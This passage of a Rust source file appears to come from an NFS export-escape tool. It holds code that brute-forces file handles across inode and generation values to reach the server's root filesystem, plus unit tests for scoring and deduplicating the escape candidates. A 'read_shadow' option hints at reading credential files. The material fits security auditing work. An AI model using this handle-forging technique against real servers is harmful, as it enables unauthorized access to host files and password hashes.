                if let Some(seed_generation) = seed_gen
                    && seed_generation > 5
                {
                    let candidates = FileHandleAnalyzer::construct_candidates_all_variants(fh, inode, seed_generation);
                    for er in &candidates {
                        all.push(escape_result_to_candidate(er, &seed.source));
                    }
                }
            }

            // 5b: Wide inode sweep: inodes 6..max_root_scan, gen=0
            for inode in 6..=config.max_root_scan {
                let candidates = FileHandleAnalyzer::construct_candidates_all_variants(fh, inode, 0);
                for er in &candidates {
                    all.push(escape_result_to_candidate(er, &seed.source));
                }
                // Also try seed_gen if available
                if let Some(seed_generation) = seed_gen
                    && seed_generation > 0
                {
                    let candidates = FileHandleAnalyzer::construct_candidates_all_variants(fh, inode, seed_generation);
                    for er in &candidates {
                        all.push(escape_result_to_candidate(er, &seed.source));
                    }
                }
            }
        }
    }

    let count_before_dedup = all.len();

    // Dedup by handle bytes, keeping the first occurrence (highest-quality seed wins
    // because seeds are ordered by quality in Phase 1).
    let mut seen: HashSet<Vec<u8>> = HashSet::new();
    all.retain(|c| seen.insert(c.handle.as_bytes().to_vec()));

    (all, count_before_dedup)
}

/// Convert an `EscapeResult` from the file_handle constructors into an `EscapeCandidate`.
fn escape_result_to_candidate(er: &EscapeResult, seed_source: &str) -> EscapeCandidate {
    EscapeCandidate { handle: er.root_handle.clone(), seed_source: seed_source.to_owned(), fs_type: er.fs_type, label: er.label.clone(), inode_number: er.inode_number }
}

// --- Tests for new pipeline types and functions ---

#[cfg(test)]
mod pipeline_tests {
    use super::*;

    // --- rootfs_score tests ---

    #[test]
    fn rootfs_score_tier1_only() {
        // proc + sys = 15 + 15 = 30
        assert_eq!(rootfs_score(&["proc", "sys"]), 30);
    }

    #[test]
    fn rootfs_score_tier2_only() {
        // etc + bin + usr = 5 + 5 + 5 = 15
        assert_eq!(rootfs_score(&["etc", "bin", "usr"]), 15);
    }

    #[test]
    fn rootfs_score_six_tier2() {
        // Six tier-2 names = 6 * 5 = 30
        assert_eq!(rootfs_score(&["etc", "bin", "usr", "var", "lib", "home"]), 30);
    }

    #[test]
    fn rootfs_score_empty() {
        assert_eq!(rootfs_score(&[]), 0);
    }

    #[test]
    fn rootfs_score_mixed_tiers() {
        // proc(15) + sys(15) + etc(5) + bin(5) = 40
        assert_eq!(rootfs_score(&["proc", "sys", "etc", "bin"]), 40);
    }

    #[test]
    fn rootfs_score_unknown_names_ignored() {
        // "data" and "backup" are not in either tier
        assert_eq!(rootfs_score(&["data", "backup", "etc"]), 5);
    }

    // --- score_tree_top tests ---

    /// Helper: build a VerifiedTreeTop with the given handle bytes and flags.
    fn make_tree_top(handle_bytes: &[u8], v3: bool, v2: bool, v4: bool, os_escape: bool) -> VerifiedTreeTop {
        VerifiedTreeTop {
            candidate: EscapeCandidate { handle: FileHandle::from_bytes(handle_bytes), seed_source: "test".to_owned(), fs_type: FsType::Ext4, label: "test".to_owned(), inode_number: 2 },
            v3_confirmed: v3,
            v2_confirmed: v2,
            v4_confirmed: v4,
            uid: 0,
            gid: 0,
            rootfs_score: if os_escape { 30 } else { 0 },
            rootfs_dirs: Vec::new(),
            os_escape,
            access_rank: AccessRank::Unknown,
        }
    }

    #[test]
    fn score_tree_top_compound_uuid_v3_os_escape() {
        // fsid_type=7 (compound UUID) -> 100, fileid_type=1 -> 15, v3 -> +10, os_escape -> +200
        let tt = make_tree_top(&[0x01, 0x00, 0x07, 0x01, 0, 0, 0, 0], true, false, false, true);
        assert_eq!(score_tree_top(&tt), 100 + 15 + 10 + 200);
    }

    #[test]
    fn score_tree_top_uuid_only_v2_no_escape() {
        // fsid_type=6 -> 50, fileid_type=2 -> 20, v2 -> +5, no os_escape
        let tt = make_tree_top(&[0x01, 0x00, 0x06, 0x02, 0, 0, 0, 0], false, true, false, false);
        assert_eq!(score_tree_top(&tt), 50 + 20 + 5);
    }

    #[test]
    fn score_tree_top_pseudo_root_v4() {
        // fsid_type=1 -> 0, fileid_type=0 -> 5, v4 -> +5
        let tt = make_tree_top(&[0x01, 0x00, 0x01, 0x00, 0, 0, 0, 0], false, false, true, false);
        assert_eq!(score_tree_top(&tt), 10); // fsid=1->0 + fileid=0->5 + v4->5
    }

    #[test]
    fn score_tree_top_all_versions() {
        // fsid_type=7 -> 100, fileid_type=1 -> 15, v3+v2+v4 -> 10+5+5=20
        let tt = make_tree_top(&[0x01, 0x00, 0x07, 0x01, 0, 0, 0, 0], true, true, true, false);
        assert_eq!(score_tree_top(&tt), 100 + 15 + 20);
    }

    #[test]
    fn score_tree_top_btrfs_fileid() {
        // fsid_type=7 -> 100, fileid_type=0x4d -> 10, v3 -> +10
        let tt = make_tree_top(&[0x01, 0x00, 0x07, 0x4d, 0, 0, 0, 0], true, false, false, false);
        assert_eq!(score_tree_top(&tt), 100 + 10 + 10);
    }

    // --- dedup_and_filter tests ---

    #[test]
    fn dedup_merges_version_flags() {
        let handle = vec![0x01, 0x00, 0x07, 0x01, 0xAA, 0xBB, 0xCC, 0xDD];
        let tt1 = VerifiedTreeTop {
            candidate: EscapeCandidate { handle: FileHandle::from_bytes(&handle), seed_source: "src1".to_owned(), fs_type: FsType::Ext4, label: "label1".to_owned(), inode_number: 2 },
            v3_confirmed: true,
            v2_confirmed: false,
            v4_confirmed: false,
            uid: 0,
            gid: 0,
            rootfs_score: 0,
            rootfs_dirs: Vec::new(),
            os_escape: false,
            access_rank: AccessRank::Unknown,
        };
        let tt2 = VerifiedTreeTop {
            candidate: EscapeCandidate { handle: FileHandle::from_bytes(&handle), seed_source: "src2".to_owned(), fs_type: FsType::Ext4, label: "label2".to_owned(), inode_number: 2 },
            v3_confirmed: false,
            v2_confirmed: true,
            v4_confirmed: true,
            uid: 65534,
            gid: 65534,
            rootfs_score: 0,
            rootfs_dirs: Vec::new(),
            os_escape: false,
            access_rank: AccessRank::Unknown,
        };

        let result = dedup_and_filter(vec![tt1, tt2], &HashSet::new());
        assert_eq!(result.len(), 1);
        assert!(result[0].v3_confirmed);
        assert!(result[0].v2_confirmed);
        assert!(result[0].v4_confirmed);
        // First credential wins
        assert_eq!(result[0].uid, 0);
    }

    #[test]
    fn dedup_removes_known_boundaries() {
        let boundary = vec![0x01, 0x00, 0x07, 0x00, 0xAA, 0xBB, 0xCC, 0xDD];
        let escape = vec![0x01, 0x00, 0x07, 0x01, 0xAA, 0xBB, 0xCC, 0xDD];

        let tt_boundary = VerifiedTreeTop {
            candidate: EscapeCandidate { handle: FileHandle::from_bytes(&boundary), seed_source: "mount".to_owned(), fs_type: FsType::Ext4, label: "boundary".to_owned(), inode_number: 0 },
            v3_confirmed: true,
            v2_confirmed: false,
            v4_confirmed: false,
            uid: 0,
            gid: 0,
            rootfs_score: 0,
            rootfs_dirs: Vec::new(),
            os_escape: false,
            access_rank: AccessRank::Unknown,
        };
        let tt_escape = VerifiedTreeTop {
            candidate: EscapeCandidate { handle: FileHandle::from_bytes(&escape), seed_source: "constructed".to_owned(), fs_type: FsType::Ext4, label: "escape".to_owned(), inode_number: 2 },
            v3_confirmed: true,
            v2_confirmed: false,
            v4_confirmed: false,
            uid: 0,
            gid: 0,
            rootfs_score: 0,
            rootfs_dirs: Vec::new(),
            os_escape: false,
            access_rank: AccessRank::Unknown,
        };

        let mut boundaries = HashSet::new();
        let _ = boundaries.insert(boundary.clone());

        let result = dedup_and_filter(vec![tt_boundary, tt_escape], &boundaries);
        assert_eq!(result.len(), 1);
        assert_eq!(result[0].candidate.handle.as_bytes(), &escape);
    }

    // --- extract_seed_gen tests ---

    #[test]
    fn extract_seed_gen_ino32_gen() {
        // fsid_type=0 (8-byte fsid), fileid_type=1 (INO32_GEN)
        // Layout: [header(4)] [fsid(8)] [inode(4)] [gen(4)]
        let mut handle = vec![0x01, 0x00, 0x00, 0x01]; // header
        handle.extend_from_slice(&[0; 8]); // fsid
        handle.extend_from_slice(&2u32.to_le_bytes()); // inode
        handle.extend_from_slice(&42u32.to_le_bytes()); // gen
        let fh = FileHandle::from_bytes(&handle);
        assert_eq!(extract_seed_gen(&fh), Some(42));
    }

    #[test]
    fn extract_seed_gen_fileid_root_returns_none() {
        // fileid_type=0 has no gen field
        let handle = vec![0x01, 0x00, 0x07, 0x00, 0, 0, 0, 0, 0, 0, 0, 0];
        let fh = FileHandle::from_bytes(&handle);
        assert_eq!(extract_seed_gen(&fh), None);
    }

    #[test]
    fn extract_seed_gen_short_handle_returns_none() {
        let fh = FileHandle::from_bytes(&[0x01, 0x00]);
        assert_eq!(extract_seed_gen(&fh), None);
    }

    // --- construct_candidates tests ---

    #[test]
    fn construct_candidates_produces_from_seed() {
        // A seed with fsid_type=7 (compound UUID, 24-byte fsid), fileid_type=0
        let mut seed_handle = vec![0x01, 0x00, 0x07, 0x00];
        seed_handle.extend_from_slice(&[0; 24]); // 24-byte fsid
        let seeds = vec![EscapeSeed { handle: FileHandle::from_bytes(&seed_handle), source: "test".to_owned(), is_root: true, nfs_version: None }];

        let config = PipelineConfig { fast: true, btrfs_subvols: 16, max_root_scan: 200, json: false, read_shadow: false, all_handles: false };
        let (candidates, before_dedup) = construct_candidates(&seeds, &config);

        // Must have at least the seed itself + known candidates + BTRFS + FS-specific
        assert!(!candidates.is_empty(), "must produce at least one candidate");
        assert!(before_dedup >= candidates.len(), "before_dedup must be >= deduped count");
        // The seed itself should be in the list
        assert!(candidates.iter().any(|c| c.handle.as_bytes() == seed_handle), "seed handle must be in candidates");
    }

    #[test]
    fn construct_candidates_fast_has_fewer_than_full() {
        let mut seed_handle = vec![0x01, 0x00, 0x07, 0x00];
        seed_handle.extend_from_slice(&[0; 24]);
        let seeds = vec![EscapeSeed { handle: FileHandle::from_bytes(&seed_handle), source: "test".to_owned(), is_root: true, nfs_version: None }];

        let fast_config = PipelineConfig { fast: true, btrfs_subvols: 16, max_root_scan: 200, json: false, read_shadow: false, all_handles: false };
        let full_config = PipelineConfig { fast: false, btrfs_subvols: 16, max_root_scan: 200, json: false, read_shadow: false, all_handles: false };

        let (fast_candidates, _) = construct_candidates(&seeds, &fast_config);
        let (full_candidates, _) = construct_candidates(&seeds, &full_config);

        assert!(fast_candidates.len() < full_candidates.len(), "fast mode ({}) must produce fewer candidates than full mode ({})", fast_candidates.len(), full_candidates.len());
    }

    // --- score_and_annotate tests ---

    #[test]
    fn score_and_annotate_sorts_descending() {
        let tt_high = make_tree_top(&[0x01, 0x00, 0x07, 0x01, 0, 0, 0, 0], true, true, true, true);
        let tt_low = make_tree_top(&[0x01, 0x00, 0x01, 0x00, 0, 0, 0, 0], false, false, true, false);

        let annotated = score_and_annotate(vec![tt_low, tt_high]);
        assert_eq!(annotated.len(), 2);
        assert!(annotated[0].score > annotated[1].score, "first must have higher score");
        assert!(annotated[0].tree_top.os_escape, "first must be the OS-ESCAPE handle");
    }

    #[test]
    fn annotate_tree_top_includes_os_escape_info() {
        let mut tt = make_tree_top(&[0x01, 0x00, 0x07, 0x01, 0xAA, 0xBB, 0xCC, 0xDD], true, false, false, true);
        tt.rootfs_dirs = vec!["proc".to_owned(), "sys".to_owned(), "etc".to_owned()];
        tt.rootfs_score = 35;

        let annotation = annotate_tree_top(&tt, 325);
        assert!(annotation.contains("rootfs dirs:"), "annotation must mention rootfs dirs");
        assert!(annotation.contains("proc"), "annotation must list proc");
        assert!(annotation.contains("sys"), "annotation must list sys");
    }
}
